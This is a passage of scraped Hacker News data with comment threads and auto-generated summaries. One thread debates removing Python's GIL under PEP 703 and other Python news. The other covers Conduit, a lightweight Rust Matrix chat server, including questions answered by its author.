switch back to the GIL automatically. So this is not a 2=>3 situation where non-compatible code breaks.Sounds good enough to me, am I missing something?replythreatripper 16 hours ago | parent | prev | next [–] I was assuming that no-GIL will only be enabled if all imported libraries support it. That means that they are marked as no-GIL ready and otherwise the import would throw an exception. Not sure how it is implemented now but that sounded very reasonable to me. The no-GIL compatible code would start with the core libraries and then expand from that. Using legacy libraries just means that you have to revert back to GIL-mode. Any no-GIL enabled library should 100% still function in GIL-mode, so I don't expect the Python 2->3 transition situation to repeat.replyrtpg 13 hours ago | parent | prev | next [–] > what about the enormous long-tail of abandoned extensions which still work today, etc.I mean there they're talking about keeping GIL in (and I imagine that will be the case for many many years) so those would still keep working. The fear is if some libraries just drop GIL-ful support, but there too I am hopeful for that not to be the case.replyBiteCode_dev 18 hours ago | prev | next [–] Summary:- Python without the GIL, for good- LPython: a new Python Compiler- Pydantic 2 is getting usable- PEP 387 defines \"Soft Deprecation\", getopt and optparse soft deprecated- Cython 3.0 released with better pure Python support- PEP 722 – Dependency specification for single-file scripts- Python VSCode support gets faster- Paint in the terminalreplyswyx 11 hours ago | parent | next [–] great recap thanks!replythiht 1 hour ago | root | parent | next [–] It's literally the summary at the top of the articleDoesn't anyone click on links anymore?replyschemescape 16 hours ago | prev | next [–] The title says \"GIL removed\", but the article says \"This means in the coming years, Python will have its GIL removed.\"I'm assuming the article is correct and the GIL has not been removed yet (but there is a plan to remove it in the future). If that's not the case, please correct me!replyJtsummers 15 hours ago | parent | next [–] It's not been removed. PEP 703 has been accepted and they've got a path forward to no-GIL. No-GIL versions will be available as experimental versions starting with 3.13 or 3.14.https://peps.python.org/pep-0703/https://discuss.python.org/t/a-steering-council-notice-about...replyBiteCode_dev 6 hours ago | parent | prev | next [–] Yes.I tried to come up with something that would convey in a few words that the GIL was going to be removed for sure this time. But as a Frenchmen, I couldn't find better.\"GIL will be removed\" was the closest, but it's very long, and it sounds like all those times we had the promise it would be, but it never did.So the Prophetic perfect tense is the best compromise: it asserts near certainty, it's short, and worst case scenario the article remove ambiguity.Plus the news popped up this week in HN front page, so a lot of people knew the context.replyumanwizard 3 hours ago | root | parent | next [–] > the Prophetic perfect tenseThat is not really a thing in normal English. I had to look up what it even means, and it apparently exists only in the translation of a few passages of Biblical Hebrew (and now, apparently, the title of your post).replyBiteCode_dev 2 hours ago | root | parent | next [–] I guess I always felt like the chosen one deep down.replyjohn-radio 11 hours ago | parent | prev | next [–] Yeah, the use of past tense in the title here is clickbaity beyond all reason.replycodedokode 14 hours ago | prev | next [–] > tools like pip-run already support running a script for which you have the deps described with such comments> Packages are installed in a temporary virtual env and deleted after the run, like npx used to do for the JS world.Is it efficient? Download packages, install them only to delete several seconds later. Wastes precious SSD cells.replyuserbinator 13 hours ago | parent | next [–] There's a massive amount of developers who unfortunately either don't know or don't care about efficiency. They'll blindly run commands with huge resource consumption with no second thought (or even an idea that such a thing is happening.)It wasn't long ago that a developer I was working with seemed to have entirely not comprehended the idea when I asked why he was searching for and downloading a dozen-MB PDF just to open (i.e. delete when closed) every time he wanted to look up one thing in it! I accumulate documentation for a project and keep most of it open throughout; I thought that was a usual thing to do, but apparently others will go online to search for that information every single time, then close the browser and reopen it whenver they need to look up something else.More publicly, it's also not long ago that Docker, and more relevantly, PyPI, have been getting worried about their bandwidth usage: https://news.ycombinator.com/item?id=24262757 https://news.ycombinator.com/item?id=27205586replywiz21c 6 hours ago | prev | next [–] For the record, I have found that on LPython's homepage, there is a pretty complete list of all \"compilers\" for Python. Really interesting list.replynico_h 6 hours ago | prev | next [–] The tenses in the headline and the article are very iffy.It’s more like there will be work to remove the GIL that will start after a particular PEP will be approved.The main reason we are still writing some stuff in java at our shop is because parallel processing sucks with multiprocessing, and trivial in java.I look forward to a future where it as trivial in or even simpler in python.replycrabbone 4 hours ago | prev | next [–] Every release brings Python closer to becoming Java. Another ten or so years, and we'll have feature parity with Java 8 or something. Maybe it will even be as fast!replyptx 1 hour ago | parent | next [–] And conversely every release of Java brings it closer to becoming Python.With Java 4 we got regular expressions.With Java 5 we got varargs, string formatting, boxed numbers, syntax for looping over collections and imports of static methods.With Java 7 we got Timsort, the sorting algorithm from Python.With Java 8 we got first-class functions.With Java 9 we got a REPL.With Java 11 we got implicit compilation of source files so you can run them directly.In more recent releases, we have previews of features corresponding to f-strings and ctypes.replycvnmalk 16 hours ago | prev | next [–] Which, except for optparse, was all on the front page yesterday. So optparse is deprecated. More work I guess apart from auditing extensions for threading.Life is great in the Python treadmill.replymaxnoe 15 hours ago | parent | next [–] IIRC, optparse was going to be be removed in 3.5(?) but outcry was large .It has a depreciation warning in the docs since 3.2.It was in the \"please just use argparse instead\" state for a long time, this \"just\" adds an actual code warning.replynickcw 14 hours ago | parent | prev | next [–] I've tried to love argparse but it is so complicated. I always have to read the docs each time I use it.getopt has its own brutal simplicity.replykzrdude 5 hours ago | root | parent | next [–] I think argparse works fine. What worries me is that it's also \"soft-deprecated\", because devs have said it should get no further development. I hope it stays around, because I use it by default as a no-dependencies solution that I know how it works.replysilon42 3 hours ago | root | parent | prev | next [–] Just last week I had to parse arguments again after a long time in a script of mine.After some googling, getopt was chosen due to it's simplicity.replymoonshinefe 7 hours ago | root | parent | prev | next [–] If you aren't averse to using a third party package, on my personal projects I always found https://github.com/docopt/docopt to be nice.You can kill 2 birds with one stone by documenting your scripts while also providing the argument structure / parsing.replyWhoopee7177 11 hours ago | prev | next [–] Why has the Python community not removed the GIL when migrating from Python 2 to Python 3?replydragonwriter 11 hours ago | parent | next [–] Because at the time of the 2-3 migration, parallelism wasn’t viewed as being as important as it is today.replywtetzner 10 hours ago | root | parent | next [–] Is that really true? We already had multicore machines, and Herb Sutter's \"The free lunch is over\" article had been published for years by then.replydragonwriter 9 hours ago | root | parent | next [–] > Is that really true?For Python by Guido (this was still in the BDfL era)? Yes. For scripting languages generally? Also yes. For computing as a whole? While parallelism was more important than in either of the preceding contexts, it was still far less important than today, so, again, yes.> We already had multicore machines, and Herb Sutter's \"The free lunch is over\" article had been published for years by then.Barely, unless you are talking about multi-CPU SMP machines (which existed for PCs back to the 386 era); the first multicore x86 processors were released in May 2005 (And Sutter’s article was in March) about a year before the major decisions about Python 3.0 (published April 2006.)replyJtsummers 10 hours ago | root | parent | prev | next [–] > Herb Sutter's \"The free lunch is over\" article had been published for years by then.Python 3.0 was released in 2008 with the work starting in early 2006 (maybe earlier, going by PEP 3000 which was published in April 2006). Herb Sutter's \"The Free Lunch is Over\" was first published in 2005. I don't think a year between its publishing and the work on Python 3 beginning qualifies as \"years\".replykzrdude 5 hours ago | root | parent | prev | next [–] Python is used much more widely and for more data tasks now than it was then, I think. Besides, we've all slowly adapted to using parallelism everywhere, it was not overnight.replyJiocus 6 hours ago | root | parent | prev | next [–] I'm sure parallelism was understood and worked towards in computing at large and within certain programming languages. The then contemporary and popular use-cases for Python (which were they?) might have had very different challenges solved by other means.(I'm just guessing here)replymixmastamyk 6 hours ago | parent | prev | next [–] The guy who was smart enough/motivated to do it showed up only a couple of years ago.replykzrdude 6 hours ago | root | parent | next [–] That guy shows up every couple of years, almost like a prophecyhttps://github.com/larryhastings/gilectomyreplyandrewstuart 17 hours ago | prev | next [–] From reading the thread on HN the other day, it sounds like removing the GIL isn't really of much value. Maybe for somewhat obscure multithreading cases.Is that right?replymasklinn 17 hours ago | parent | next [–] > Maybe for somewhat obscure multithreading cases.They're only \"somewhat obscure\" because currently you can't do it at all, so you don't do it and you do something else: it's of value for any case where you're multithreading for computational parallelism (as opposed to IO concurrency). The PEP also outlines a bunch of other situations where using process-based parallelism is problematic: https://peps.python.org/pep-0703/#motivationWith the proviso that while it will work for all pure-python code out of the box[0] loading any native package which has not opted into \"no gil\" mode will re-enable the GIL: https://peps.python.org/pep-0703/#py-mod-gil-slot[0] modulo new race conditions where the code relied on the GIL for correctness, something which isn't strictly correct and can already break when the scheduler logic changesreplycrabbone 4 hours ago | root | parent | next [–] > currently you can't do it at allIs not true. First of all, Python threads are mapped to OS threads. So, you can do \"something\". Now, in CPython C API there are tools for releasing and acquiring the global lock. They aren't complicated, and I used them in my own extensions. Not sure how popular across other extensions is this practice, but, at least some do use it. Some Python native functions release and acquire this lock while running in non-main thread. For the most part, it's the functions that perform blocking I/O.To sum this up and to make it easier to conceptualize, I describe this as Python can sleep concurrently, but can do no work concurrently.As to \"obscure multithreading cases\"... well, ironically, some Python libraries use Python threads unironically... I believe Paramico uses them, but this is from memory, so please don't blame me if that's not the case. It's not very popular, but some have actually used threads. Typically it gives you no benefits when using Python, but on an odd day... There's also a thing about when Python threads can switch, which makes certain code impossible to race, but also makes some particular edge cases of errors harder to reproduce.So, developers working on libraries that don't use any multithreading will probably not notice, but, these cases are rare because Python is on the path of dependency bloat. Which means that in a large enough project, you are bound to get a library that uses threads. And then you will be impacted by the bugs in multithreading even though you, personally, had nothing to do with it.replyFartyMcFarter 2 hours ago | root | parent | next [–] > So, you can do \"something\".You can only do \"something\" if that doesn't involve interpreting actual Python code. Which is a pretty big deal since we're talking about Python programming.replyJtsummers 17 hours ago | parent | prev | next [–] That discussion was amusing. Removing the GIL opens up the possibility of actually getting a real performance benefit from multithreaded Python code. That's the value. Given every modern desktop and server is multicore (and increasingly getting to tens of cores if not hundreds), multithreading in Python unhampered by the GIL will be a useful thing. And no, multiprocessing is not a good alternative to multithreading. It's just an alternative, but it's slower, uses more memory, and coordination between processes is slower than between threads.replyamomchilov 13 hours ago | root | parent | next [–] Heck, even my watch is dual-core.Now i doubt I’ll be writing Python for it any time soon, but to call multithreading obscure is… really odd.replyzarzavat 11 hours ago | root | parent | prev | next [–] Python is not a language for writing fast code. Python is a relaxed language for things that don’t have to be fast. If you need something to be fast you are supposed to use a C extension and control it with Python - that’s been the dogma for as long as I can remember to avoid exactly this kind of pathological race to performance in a language that was never designed for it.By using Python you are already leaving a ton of performance on the table in single-threaded code compared to a fast, compiled language.replygjulianm 2 hours ago | root | parent | next [–] It's always a tradeoff, but I'm surprised to see so many people say that just because Python isn't fast it shouldn't get multithreading.Yes, by using Python we leave a lot of performance on the table. We also get a lot of dev performance, just because of the amount of libraries available, dynamic language features, quick development.. So it's not always a clear decision between Python or a compiled language.> If you need something to be fast you are supposed to use a C extension and control it with PythonSo what do we do with the case where we need to control the C extension from multiple threads? Because that's currently my problem. The C extension we developed do release the GIL, but because the Python code that does the calls to the extension can't be really multithreaded, the performance gain we get is minimal.replytgv 6 hours ago | root | parent | prev | next [–] Yup. I don't know why you would insist on having multiple Python threads, especially given the high risks. Python is only suitable for coordinating/scripting large libraries written in other languages or for quick and easy development. Python programs should not reach the stage where their use in production is hampered by lack of multi-threading.replyFartyMcFarter 17 hours ago | parent | prev | next [–] I would disagree with that.The GIL means you can't use Python multithreading in order to take advantage of more CPU time by parallelism. Obviously getting rid of the GIL makes that a real option, just as it is in other languages.replysqueaky-clean 17 hours ago | parent | prev | next [–] Currently, yes that's kind of true. But it's really only considered obscure because the GIL makes it so you either have to do some weird non thread pattern or go with a different language, and people often go with a different language.Kind of a Catch-22 of \"Well no one uses it that way, so why should we make it possible to use it that way? Well, no one uses it that way because it's impossible to use it that way\"replykukkamario 17 hours ago | parent | prev | next [–] Well Python doesn't really do proper multi-threading currently thanks to GIL blocking any additional execution threads. So removing it would enable making Python code that is actually multi-threaded without resorting to extra processes and their overhead.So if you are writing small single process Python script then removing GIL shouldn't really change much. If you are doing some heavier computing or eg. running server back-end, then there are significant performance gains available with this change.replyumanwizard 17 hours ago | root | parent | next [–] You don’t have to use separate processes to get the benefit of multithreading in Python today — you can also call into a library written in native code that drops the GIL (e.g. Numpy or Pytorch).replymasklinn 17 hours ago | root | parent | next [–] Even then the GIL can cause issues, concerns of PyTorch are specifically one of the motivations of the PEP, and one of the reasons Meta / FB really really wants this:> In PyTorch, Python is commonly used to orchestrate ~8 GPUs and ~64 CPU threads, growing to 4k GPUs and 32k CPU threads for big models. While the heavy lifting is done outside of Python, the speed of GPUs makes even just the orchestration in Python not scalable. We often end up with 72 processes in place of one because of the GIL. Logging, debugging, and performance tuning are orders-of-magnitude more difficult in this regime, continuously causing lower developer productivity.replyumanwizard 17 hours ago | root | parent | next [–] I feel like orchestrating thousands of GPUs is such a niche use case that it’s fair to expect the people wanting to do it to learn a more suited language, rather than ruining Python for everyone else.replyctoth 14 hours ago | root | parent | next [–] I notice you used the strong emotional word \"ruining\" when talking about the effect on Python of this change. Why do you believe an obscure runtime concurrency detail which will make more things possible will \"ruin\" the language?Now match and :=? Those definitely ruin the language. ;-)But seriously, relax, nothing bad is happening here. It's not just people who have to use the torch launcher who have been bitten by Python's currently-terrible multicore story. I've been a Python programmer for 15 years and I think this is a wonderful change.replyumanwizard 13 hours ago | root | parent | next [–] > Why do you believe an obscure runtime concurrency detailIt is not obscure. It will make it much more difficult to write native-code extensions which is IMO the whole point of Python.replytsimionescu 8 hours ago | root | parent | next [–] The point of Python in your opinion is to write non-Python code?replyumanwizard 3 hours ago | root | parent | next [–] Yes, like bash, Python is a language that exists mainly as glue for code written in other languages. Do you think we need to add multithreading to bash?replytgv 6 hours ago | root | parent | prev | next [–] You are completely right. Why don't they write their stuff in another language? They've got the resources. Now the rest of the world will suffer the consequences, one of which may be that the devs of native libs will simply abandon the work, or that those libs will become too difficult to use for the casual or starting programmer, completely defeating the purpose.I'm fine with two builds, but not a single non-GIL build.replysidlls 16 hours ago | root | parent | prev | next [–] It's (likely) much less expensive (in many ways, not just financially) to employ a larger number of python programmers than a smaller number of them skilled in a language more appropriate for the use case. Engineer flexibility, salary costs, maintenance/correctness concerns with implications for development time, etc., are all factors here. The technical choice of \"python or not python\" is rarely the only--or even most important--choice to make.replycpgxiii 16 hours ago | root | parent | prev | next [–] That only works in some cases, if the boundary between Python and native code is absolute. In many cases users want to extend/configure the behavior of that native code, e.g. through callbacks or subclassing, and the GIL makes the behavior prohibitively slow (needing to lock/unlock to serialize at any of these potential Pythonnative boundaries) or unsafe (deadlocks/corruption if the GIL isn't handled).There's a lot of C++ code bound in python (e.g. via pybind11) where the GIL currently imposes a hard bound on how users can employ parallelism, even in \"nominally\" native code.replyoivey 17 hours ago | parent | prev | next [–] That was the opinion of a handful of vocal posters. The overhead of using multiprocessing and/or some network service is extremely high for a lot of applications.replycsmpltn 17 hours ago | parent | prev | next [–] There are plenty of other Python VMs that don't have a GIL and can be used already today, out of the box (examples include Jython and IronPython). Despite that fact - CPython remains the most popular Python VM out there (it utilizes a GIL).Instead of waiting for the GIL to be removed out of CPython - take your fancy Python code and just run it using a different VM. It's literally as simple as that.If the GIL was such a bottleneck as people make it out to be - people would move off of CPython a long time ago. But they won't, despite having the options. This only serves to prove that 95%+ of the workflows people build with Python can be satisfied regardless of GIL, often using some of the other parallelism mechanisms available in Python today (multiprocessing, asyncio, etc).Most of the stuff people build with Python are CRUD apps, Jupyter notebooks, automations, tinkering, small hacks, etc. If you're okay with not utilizing all of your 64k CPUs at home - Python's multiprocessing and asyncio libraries should serve you just fine.The whole GIL/No-GIL conversation is a complete waste of time and a distraction. People have all the options they need already here and now - but slinging crap at eachother over an issue tracker is so much fun that people can't help it.replyoivey 17 hours ago | root | parent | next [–] People stay on CPython due to the performance of C extensions and the vast ecosystem based on them. The fact that people have stuck with CPython isn't at all evidence that they like the GIL or that it doesn't lead to significant technical problems.Besides the C extension issue, Jython is based on Python 2.7 and IronPython appears to be on 3.4. These aren't serious alternatives.replysideeffffect 7 hours ago | root | parent | next [–] Not true. They're is GraalPython, which is for Python 3 and supports also native code extensions.https://github.com/oracle/graalpythonreplyoivey 6 hours ago | root | parent | next [–] What is not true? I don’t see what this is supposed to address in my post. I cited Jython and IronPython because that’s what the person I was responding to mentioned.GraalPy looks neat, but is experimental/young still. Notably, it has a GIL specifically to be compatible with CPython.replyquickthrower2 17 hours ago | root | parent | prev | next [–] Would a large codebase seemlessly run on another interpreter?replybafe 15 hours ago | root | parent | next [–] Not likely, particularly if you depend on modules written (partly) in C like numpy/scipy etcreplyquickthrower2 15 hours ago | root | parent | next [–] I just did some searching around PyPy and that seems to be the case. IronPython is out of support now but the looks of it. Which is a shame. I heard of it 10 years ago, but assumed it was some \"Microsoftized Python\" and not at all a compatible thing :-)replybafe 14 hours ago | root | parent | next [–] The same happened to jython which is all but dead and stuck forever at python 2.7If you stick to \"pure Python\" there's a larger chance you can use any python runtime and be able to run your codereplytgv 6 hours ago | root | parent | prev | next [–] I think you underestimate the problems that will occur in a large code base when the GIL is gone. It'll play out like this:Test will be fine, but production will have some weird bugs. Nobody understands it. The devs end up adding locks everywhere, bringing down performance, or creating dead locks. In the end, they migrate back to Python 3.16.Here's free lesson number 1: start adding stress tests now.replyactionfromafar 17 hours ago | root | parent | prev | next [–] If you have a lot of code, there’s plenty of Internet drama to be had in moving to another runtime, too.replyqbasic_forever 14 hours ago | parent | prev | next [–] Correct, it will help with CPU-limited, embarrassingly parallelizable problems... which are much less common than you think.replyklyrs 13 hours ago | root | parent | next [–] Embarrassingly parallelizable problems are extremely common in my life. I end up breaking out of python to use gnu-parallel, which is fine but annoying.replyNursie 8 hours ago | root | parent | prev | next [–] You don’t need embarrassingly parallel problems, you just need code doing lots of the same thing at the same time for this to be a win.replyActorNightly 14 hours ago | parent | prev | next [–] The big thing that is driving no GIL is the speed up of processing data for ML, which afaik cannot be done with multiprocessing.replySpivak 17 hours ago | parent | prev | next [–] Right now multi-threading makes your Python code (that isn't really C) slower. The only real use of it is time slicing so you don't starve more important code like the web server or UI thread. You still have all the concurrency issues because your threads can still still be paused and resumed at arbitrary times. It does allow some operations in Python to be atomic but I, maybe naively, assume that those cases will be guarded by new, not whole interpreter, locks.With no-gil your multithreading code can, with no change to your code, take advantage of multiple cores and actually speed up your program. Ifreplywiz21c 6 hours ago | prev | next [–] Is LPython comparable to Nuitka ?replydagw 4 hours ago | parent | next [–] It seems to be closer to pythran than Nuitka. Mainly in that Lpython only supports a subset of python and focuses on performance of numeric code. Nuitka focuses primarily on being able to compile all of python, and has performance only as a secondary goal.replymkoubaa 17 hours ago | prev | next [–] And alternative C APIs are being proposed, which is as exciting as all of the abovereplydevwastaken 17 hours ago | prev | next [–] This is exactly what I have been looking forward to. Allow me to do no-gil, let me the developer make that choice. There are issues with that certainly, but I am conscious of this fact and given an analysis of no-gil benefits it is significantly more beneficial to have no-gil for certain use cases.One of the most significant of these cases to me is threading outside an Operating system context. What if I want to use both of the cores to a Cortex M0? Multiprocessing can't help me, there are no processes. If I need locking, I will impliment it using the platform I have available to me.The second is the fact that CPU's are increasingly scaling in core count. When I have to use multiprocessing the program becomes far more complex than one would expect. Why am I doing message passing and shared memory when the OS and CPU supplies better tools already? It also pollutes the process ID's. Imagine if we built every application in Python - there would be hundreds of thousands of individual processes all to use multiple cores. Because this is a problem mostly unique to python we often end up having to build applications in other languages that otherwise would have been better in Python.I want a world where I can say \"just use python\" to almost anything. Telling new coders to drop their favorite language and use any other language to get the result they want immedietely kills the innovation they are working on. Instead of spending time creating the idea, they're spending time learning a languages I believe are unnecessary.replyActorNightly 14 hours ago | parent | next [–] > let me the developer make that choice.The final push towards making no-GIL as the only option is the big issue here. An optional no-GIL is ok (although a waste of time), making it default is bad.>What if I want to use both of the cores to a Cortex M0The solution to anything performant in Python is writing the C extension, just like Numpy did. Python isn't meant to be a performant language. The GIL allows you to write code without thinking about complexities of parallelism.replybigbillheck 17 hours ago | prev | next [–] Python's been a little too happy to hard-deprecate things for my liking, so this soft-deprecation sounds pretty good.replyhanniabu 17 hours ago | prev | next [–] Will writing multithreaded code become easier? Or will the developer UX remain the same?replydpedu 17 hours ago | parent | next [–] The opposite, writing multithreaded code will get harder because you'll likely need to handle concurrency issues yourself that the GIL previously avoided. But, the tradeoff is that multithreaded programs could now actually achieve multithreaded performance gains.replyJtsummers 16 hours ago | root | parent | next [–] > writing multithreaded code will get harder because you'll likely need to handle concurrency issues yourselfI'd phrase this differently: Writing correct multithreaded code will be just as challenging (or not, depending on the person and their comfort with concurrent and parallel code development) as before, but now you won't be able to get away with sloppy multithreaded code that relied on the GIL to not break.replyfbdab103 16 hours ago | root | parent | next [–] It was correctly written to the invariant promises of the platform at the time. If Python is altering the deal, that does not suddenly make the library writer at fault.replyoivey 16 hours ago | root | parent | next [–] There seems to be some confusion here. The GIL is not an invariant of Python that makes your code thread safe. Python is not altering the deal. You can still use threads to write concurrent code in Python today, and you'll still run into all of the classic concurrency related bugs.People just mostly don't bother writing threaded code in Python today because it provides no performance benefit. That may change, and it very likely will expose many threading bugs that already exist in many libraries that just have never been found.replydpedu 14 hours ago | root | parent | next [–] You're right, the GIL certainly doesn't automatically make all code thread-safe. However, it does make some operations that would normally be problematic in a multithreaded context thread-safe. Such as: appending to a list, updating a dict, modifying object attributes, and others.https://docs.python.org/3/faq/library.html#what-kinds-of-glo...replyangus_gh 13 hours ago | root | parent | next [–] The no-gil fork of Python makes the builtin collections thread-safe, so that will remain not an issue (see the \"Collection thread-safety\" section of the design doc https://docs.google.com/document/d/18CXhDb1ygxg-YXNBJNzfzZsD... )replyumanwizard 13 hours ago | root | parent | prev | next [–] Why do you say code relying on the GIL is incorrect? The GIL is a documented part of Python.replybvrmn 16 hours ago | root | parent | prev | next [–] A single Go thread still replaces 10 Python threads, speaking very roughly. It's a quite particular narrow set of problems noGIL would solve.replyqbasic_forever 14 hours ago | parent | prev | next [–] No it will be the same level of skill and difficulty to do correct shared memory multithreaded programming. You'll have to manually manage locks and reason about potential for deadlock or other race conditions.If anything it will be harder as the implicit serialization of the GIL being removed means libraries might suddenly develop race conditions that you've never experienced or seen before, likely causing spectacular crashes and undefined behavior or bugs.reply 2 more comments...",
    "originSummary": [
      "In July 2023, several updates and developments were announced for Python.",
      "The Global Interpreter Lock (GIL) in Python has been removed, which can improve performance and allow for better utilization of multiple cores.",
      "Python now has a new compiler called LPython.",
      "Pydantic 2 has been released with improvements in speed and stability.",
      "The getopt and optparse modules have been soft deprecated.",
      "Cython 3.0 now has better support for pure Python.",
      "A new proposal called PEP 722 has been made for specifying dependencies in single-file scripts.",
      "Python VSCode support has been improved for faster performance.",
      "A new terminal-based paint application called textual-paint has been introduced."
    ],
    "commentSummary": [
      "The discussion is centered around optimizing Python code for multi-threaded performance and the possible removal of the Global Interpreter Lock (GIL) in Python.",
      "Various perspectives are shared, including suggestions for using tools like `gunicorn` and `gevent` for multiprocessing and multithreading.",
      "Alternatives such as using languages like C++ or Rust for better performance are considered.",
      "Suggestions for optimization are provided, such as utilizing caching or shared memory with Redis or memcached.",
      "Concerns about issues like deadlocks and resource usage are raised, along with suggestions for alternative languages or technologies.",
      "The performance drawbacks of Python and potential solutions like using other languages or leveraging JIT compilers are discussed.",
      "The compatibility of different programming languages, transition challenges, and complexities of programming language design and usage are mentioned.",
      "The potential benefits and drawbacks of removing the GIL in Python are debated, with varying opinions on performance improvements and potential concurrency issues."
    ],
    "points": 369,
    "commentCount": 258,
    "retryCount": 0,
    "time": 1690745541
  },
  {
    "id": 36937713,
    "title": "Conduit: Simple, fast and reliable chat server powered by Matrix",
    "originLink": "https://conduit.rs/",
    "originBody": "Conduit Issues Changelog Documentation Source Code Host your own chat server Conduit is a simple, fast and reliable chat server powered byLearn More ⇩ What is Matrix? Why Conduit? Links DonateNote: This project is beta. It can be used already, but is missing some smaller features.What is Matrix?Matrix is an open network for secure and decentralized communication. Users from every Matrix homeserver can chat with users from all other Matrix servers. You can even use bridges to communicate with users outside of Matrix, like a community on Discord.Why Conduit?Conduit is a lightweight open-source server implementation of the Matrix Specification with a focus on easy setup and low system requirements. That means you can make your own Conduit setup in just a few minutes.Conduit keeps things simple, it's a single binary with an embedded database and can be much faster than other server implementations in some cases.LinksWebsite: https://conduit.rs Git and Documentation: https://gitlab.com/famedly/conduit Chat with us: #conduit:fachschaften.orgDonateLiberapay: https://liberapay.com/timokoesters/ Bitcoin: bc1qnnykf986tw49ur7wx9rpw2tevpsztvar5x8w4nServer hosting for conduit.rs provided by the Matrix.org Foundation.Conduit was sponsored by German BMBF for 6 months in 2021. FKZ: 01lS21S11Timo Kösters © 2023 Impressum Datenschutz",
    "commentLink": "https://news.ycombinator.com/item?id=36937713",
    "commentBody": "Conduit: Simple, fast and reliable chat server powered by Matrix (conduit.rs)356 points by nateb2022 13  160 commentsashton314 10 hours ago | next [–] I’ve run a self-hosted Conduit instance for some years now. Pros: easy to install and use. Cons: it’s beta software!That said, it’s been really good for me. Reliable chat between my and a few friends, plus some big-ish rooms that I participate in.The author also works on Veloren[1]—another fun Rust project![1]: https://veloren.netreplysocceroos 9 hours ago | parent | next [–] I've been using Conduit for quite a while now and have found it to be very good. For ages though it has been missing support for spaces, but support has just landed in the development builds and it is great. I've already updated my service and it has worked as expected.replyArkanosis 5 hours ago | parent | prev | next [–] I've been running it for 10 months now. Very smooth experience (both installation and usage).I'm the only user on my server and I've not joined any very active room, but so far its impact on my small VPS performance has been negligible.replyvmfunction 5 hours ago | parent | prev | next [–] Yeah seems like a good alternative to run the dentrite (go) server. That seems to be in development forever. At this point, the python server is taking too much resources, nice to see an alternative to go the server.replysmoldesu 7 hours ago | parent | prev | next [–] > The author also works on VelorenThat game is fucking cool. A couple years ago me and some friends compiled it for kicks and giggles to see what it was all about. To our surprise, the game ran silky smooth on my GTX 1050 Ti. We get into a lobby. We play for a half hour.We're just exploring (the map is barebones but has cool landmarks) when I realize that you can scroll to zoom out from your character. In a psychadelic twist, you can just keep zooming out past normal ARPG levels and into a minimap-scale world, then above the clouds, all without dropping a frame.I don't know how well-maintained the project is today, but it's got the bones for a badass RPG. One of these days I'll hop back on...replyfreeCandy 5 hours ago | root | parent | next [–] The game is very actively developed and there are lots of devlogshttps://veloren.net/devblogsIf the last time you played was a few years ago, they've pushed out a huge amount of features since then. Very impressive for a fully open source game.replysph 2 hours ago | root | parent | prev | next [–] From Veloren's home page:\"Veloren is a multiplayer voxel RPG written in Rust. It is inspired by games such as Cube World, Legend of Zelda: Breath of the Wild, Dwarf Fortress and Minecraft.\"I love how pointing out that it's written in Rust is more important that describing what the game is about or inspired by. Classic open source project unsure of who's the intended audience.replybadrabbit 8 hours ago | parent | prev | next [–] I wish there was a similar client that has full feature support but that's the problem with matrix, too many features, signal, discord, slack, zoom and teams all meshed into one thing. Would be nice if they had a secure chat only sub-protocol.replytimokoesters 6 hours ago | prev | next [–] Hello, I'm Timo and I started the Conduit project a few years ago. Feel free to ask some questions.replysydbarrett74 38 minutes ago | parent | next [–] Timo,Thank you and kudos for all of your hard work on this. I will definitely be checking your project out. :)-sydbarrett74reply3np 5 hours ago | parent | prev | next [–] Thanks for checking in!Any thoughts on matrix-p2p aka pinecone which is now being developed against dendrite? Any thoughts on \"p2p-ifying\" Conduit in the foreseeable future?https://github.com/matrix-org/pineconehttps://archive.fosdem.org/2022/schedule/event/matrix_p2p_pi...replytimokoesters 4 hours ago | root | parent | next [–] P2P sounds great and I'd love to implement it when it is ready. I think Conduit is pretty well suited for this. But it will still take quite some time until Matrix is ready for p2p clients, it needs some significant protocol changes: https://arewep2pyet.com/replyArkanosis 4 hours ago | parent | prev | next [–] Hi Timo!I've been using Conduit for 10 months now and I love it. Thank you so much for it!I've two questions:- Is there any concern to have with regards to its future when you finish university? You seem to be by far the most active contributor and I'm worried the project is still dependent on how much time you can afford to put into it;- What is the best way for a Rust / Linux developer to do a first impactful contribution to Conduit? With 155 open issues on GitLab at the moment and no problem really standing out for me as a user, I don't know where to start :pThanks!BTW I hope you land a great job; I'd happily recommend you where I work, but we don't have any office near Dortmund unfortunately… Feel free to reach out to me if Dortmund / remote is not a requirement.replytimokoesters 4 hours ago | root | parent | next [–] Thank you for the kind words!1: I can't say how much time I will have for Conduit, but I think the project is in a good shape and I think it can reach a stable release without me working full time on it, but of course it will take longer.2: I think a good way to start is to hang around in the Conduit Matrix room and see if any issues pop up. Often these are relatively simple things like \"these logs should have more details\" and are a good way to get started.I will also use this opportunity to link my LinkedIn profile: https://www.linkedin.com/in/timokoesters/replyArkanosis 2 hours ago | root | parent | next [–] Thank you for your answer.1: That's a relief :)2: I've just joined `#conduit:fachschaften.org`; we'll see if I can help somehow.replyrjvs 3 hours ago | parent | prev | next [–] Hi Timo, is there a document somewhere that describes how Conduit compares feature-wise to Synapse or to the Matrix spec? It’s not clear to me if the goal to develop a fully-featured matrix server, or if there is some subset of scale or functionality that you’re aiming for; could you comment on that?replytimokoesters 2 hours ago | root | parent | next [–] Hi, the goal is to create a fully-featured server that works seamlessly with all Matrix clients. The one notable exception is that we will not implement support for \"outdated\" room versions, which means that there are some rooms that are unjoinable because they are too old, those should be upgraded to a more recent room version.I'm also prioritizing features needed for smaller instances, instead of things like user management or horizontal scaling.replyCorsome 6 hours ago | parent | prev | next [–] Do you use Conduit daily yourself? I'm wondering if it's stable for daily use.replytimokoesters 6 hours ago | root | parent | next [–] Yes, I use my Conduit instance for all my development work and also host a big Discord bridge on it (for https://veloren.net, which was mentioned in another comment).reply3np 5 hours ago | root | parent | next [–] Very nice!Sounds like AppService/bridge support is on par with Synapse at this point (and maybe has been for quite a while?) - any gaps to be aware of in that department?replytimokoesters 4 hours ago | root | parent | next [–] Most bridges should just work, some require messing around a bit, also see https://news.ycombinator.com/item?id=36939480, I haven't debugged this yet.You can find some bridge documentation here: https://gitlab.com/famedly/conduit/-/blob/next/APPSERVICES.m...replynani8ot 3 hours ago | root | parent | prev | next [–] I've used Conduit for about a year now with bridges and it works flawlessly. It doesn't have all features but a recent release added Spaces and end-to-bridge encryption (not as big of a deal when selfhosting server + bridges, but great nonetheless), so I'm not even sure what is still missing.replyMayeulC 5 hours ago | parent | prev | next [–] Is there a migration path for Synapse users?replytimokoesters 5 hours ago | root | parent | next [–] No, currently you have to start a completely new server. At some point after reaching a stable 